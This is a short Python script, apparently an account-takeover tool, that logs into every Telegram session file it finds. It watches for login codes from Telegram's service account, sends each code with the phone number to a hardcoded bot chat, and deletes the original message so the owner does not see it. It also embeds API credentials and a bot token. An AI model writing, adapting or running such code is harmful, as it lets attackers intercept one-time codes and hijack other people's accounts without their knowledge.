import os
import re
import asyncio
import requests
from telethon import TelegramClient, events

# Ganti dengan milikmu
api_id = 23416622
api_hash = 'd1bc12a03ea26416b38b4616a36112b0'

BOT_TOKEN = '7961891403:AAE8sydM_elnN_J8uoGLQ1urCecoCDxPHdY'
CHAT_ID = '7763955214'

otp_pattern = re.compile(r'\b\d{5,6}\b')

def send_to_bot(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        'chat_id': CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'
    }
    try:
        requests.post(url, data=data)
    except Exception as e:
        print(f"[!] Gagal kirim ke bot: {e}")

async def monitor_session(session_file):
    phone_number = session_file.replace('.session', '')
    session_path = phone_number  # Tanpa folder

    client = TelegramClient(session_path, api_id, api_hash)

    await client.start()
    print(f"[✓] Memantau session: {phone_number}")

    @client.on(events.NewMessage(from_users=777000))
    async def handler(event):
        msg = event.message.message
        otp_match = otp_pattern.search(msg)

        if otp_match:
            otp_code = otp_match.group()
            print(f"[OTP] {phone_number} menerima OTP: {otp_code}")
            send_to_bot(f"📬 OTP dari *{phone_number}*: `{otp_code}`")

            try:
                await event.delete()
                print(f"[✓] Pesan OTP dari 777000 dihapus.")
            except:
                print("[!] Gagal menghapus pesan OTP.")

    try:
        await client.run_until_disconnected()
    except Exception as e:
        print(f"[!] Error pada session {phone_number}: {e}")
    finally:
        await client.disconnect()
        print(f"[✗] Selesai pantau session: {phone_number}")

async def main():
    session_files = [f for f in os.listdir('.') if f.endswith('.session')]

    for session_file in session_files:
        await monitor_session(session_file)

if __name__ == '__main__':
    asyncio.run(main())
